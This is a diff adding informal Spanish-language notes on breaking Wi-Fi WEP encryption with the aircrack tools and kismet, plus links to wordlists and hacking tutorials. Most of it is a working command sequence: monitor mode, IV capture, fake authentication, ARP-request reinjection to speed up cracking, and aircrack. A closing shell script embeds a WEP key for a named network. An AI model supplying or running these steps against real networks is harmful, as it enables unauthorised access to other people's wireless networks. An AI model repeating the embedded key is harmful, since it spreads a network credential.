@@ -1,0 +1,68 @@
+clave no es estática (¿se está usando EAP/802.1X
+WPA-PSK (Wi-Fi Protected Access - Acceso Protegido Wi-Fi)  pre-shared key
+WEP (Wired Equivalent Privacy - Privacidad Equivalente a Cableado)
+autenticación abierta: permite asociarse, pero solo envia paquetes si conocemos la clave
+
+
+live cds con todo preparado: WHAX o Troppix
+Para instalar troppix copiar la estructura / de /initrd/mnt/squashfs a la estructura de directorios que queramos. o bien usar /root/bin/hddinstall.sh . cuidado con el último paso de Grub.
+
+inyección de paquetes sólo con prism2, prismGT, rtl8180, ral2500.
+
+procedimiento:
+airmon.sh start ra0
+pone la tarjeta en modo monitor, canal opcional
+
+airodump ra0 out 0
+crea out.cap mirando todos los canales
+copiamos bssid (mac del ap) y canal
+
+airodump ra0 out 9 1
+crea out.cap mirando canal 9 y quedandose solo con los ivs
+
+en otro terminal...
+
+iwpriv ra0 mode 2
+aireplay –1 N –e SSID –a BSSID –h 0:1:2:3:4:5 ra0
+se asocia (ataque 1, autenticación). N es cada cuanto queremos reasociarnos. normalmente N=0 indicando que no hay que reasociarse. problema: que haya filtrado mac....
+aireplay –3 –b BSSID –h 0:1:2:3:4:5 –x 600 ra0
+ataque 3: reinyección de peticiones ARP
+inyecta paquetes para aumentar el número de respuestas con clave
+asi el crackeo tarda menos.
+
+aircrack –x –0 out.ivs
+no aplica fuerza bruta en los dos ultimos bytes, es más rápido
+saca la salida en color.
+
+
+kismet –Ikismet:9 –X
+canal 9 sin saltos
+
+iwconfig wlan0 wep s:abcdf
+iwconfig wlan0 wep 01234567
+
+herramientas:
+las que tengo en mi pc, poner sus webs.
+
+diccionarios:
+http://ftp.se.kde.org/pub/security/tools/net/Openwall/wordlists/ http://www.cotse.com/tools/wordlists1.htm 
+http://www.cotse.com/tools/wordlists2.htm
+
+este texto es un compendio de:
+(aircrack README) http://hwagm.elhacker.net/htm/traduccion.htm
+http://hwagm.elhacker.net/wpa/wpa.htm 
+www.crimemachine.com/Tuts/Flash/whax-aircrack-wep.html
+www.crimemachine.com/Tuts/Flash/whax-aircrack-wpa.html
+http://www.kismetwireless.net/documentation.shtml
+http://www.hckrs.org/proyectosabiertos/wep.html
+http://www.remote-exploit.org/index.php/Tutorials
+
+== Cambiar de red con script ==
+ #!/bin/sh
+ 
+ killall nm-applet
+ ifconfig wlan0 down
+ iwconfig wlan0 essid WLAN_C8 key 5A303031333439454343344338
+ ifconfig wlan0 inet 192.168.1.172
+ ifconfig wlan0 up
+ route add default gw 192.168.1.1
